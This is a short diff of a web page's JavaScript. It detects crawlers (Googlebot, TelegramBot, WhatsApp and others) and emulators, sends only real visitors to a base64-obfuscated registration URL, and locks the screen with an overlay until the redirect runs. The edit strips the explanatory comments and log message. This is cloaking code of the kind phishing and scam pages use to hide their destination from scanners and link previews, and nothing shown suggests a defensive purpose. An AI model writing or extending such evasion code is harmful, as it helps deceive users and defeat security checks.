@@ -23,7 +23,6 @@ const BOT_UA = [
   "TelegramBot","LinkedInBot","WhatsApp","Googlebot","Bingbot","Pinterest"
 ];
 
-// === 检测函数 ===
 function isBot(){
   const ua = navigator.userAgent;
   return BOT_UA.some(bot => ua.toLowerCase().includes(bot.toLowerCase()));
@@ -52,17 +51,15 @@ function isEmulator(){
     return false;
 }
 
-// === 跳转逻辑 ===
 function tryRedirect(){
   if (!isBot() && !isEmulator()) {
     const regUrl = atob(REG_PAGE_ENC);
     window.location.replace(regUrl);
   } else {
-    console.log("爬虫或模拟器访问，停留在当前页面");
+    
   }
 }
 
-// === 锁屏并延时跳转 ===
 function lockPageUntilRedirect(ms){
     const overlay = document.createElement('div');
     overlay.style.position = 'fixed';
